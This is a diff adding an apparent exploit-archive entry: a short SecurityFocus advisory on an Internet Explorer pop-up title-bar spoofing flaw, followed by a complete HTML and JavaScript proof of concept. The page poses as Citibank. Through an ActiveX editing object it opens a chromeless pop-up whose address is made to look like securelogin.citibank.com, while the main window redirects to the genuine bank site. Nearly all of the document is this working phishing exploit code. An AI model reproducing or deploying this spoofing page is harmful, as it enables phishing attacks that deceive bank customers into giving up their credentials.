@@ -1,0 +1,58 @@
+source: http://www.securityfocus.com/bid/12602/info
+
+Internet Explorer is reported prone to a pop-up window title bar spoofing weakness.
+
+The weakness is reported to exist due to a flaw that manifests in script-initiated pop-up windows.
+
+This issue may be leveraged by an attacker to display false URI information in the title bar of an Internet Explorer pop-up dialog window. This may facilitate phishing style attacks; other attacks may also be possible.
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- saved from url=(0014)about:internet -->
+<html lang="x-klingon">
+<head>
+<title>Welcome to Citibank</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Script-Type" content="text/javascript">
+
+<script type="text/javascript">
+<!-- Begin
+function shellscript()
+{
+  window.focus();
+  pURL = 'http://securelogin.citibank.com"+".e-gold.com/';
+  sP = 'toolbar=0,scrollbars=0,location=0,statusbar=0,';
+  sP += 'menubar=0,resizable=0,width=315,';
+  sP += 'height=200,left = 250,top = 200'
+  day = new Date();
+  id = day.getTime();
+  eval("page" + id + " = window.open(pURL, '" + id + "',sP);");
+}
+
+function main()
+{
+  targetURL = 'http://citibank.com/us/index.htm';
+  x.DOM.Script.execScript(shellscript.toString());
+  x.DOM.Script.setTimeout("shellscript()");
+  location.replace(targetURL);
+}
+
+setTimeout(' main() ',1000);
+
+// End -->
+</script>
+
+</head>
+
+<object
+        id="x"
+        classid="clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A"
+        width="1"
+        height="1"
+        align="middle"
+>
+<param name="ActivateApplets" value="1">
+<param name="ActivateActiveXControls" value="1">
+</object>
+
+</body>
+</html> 
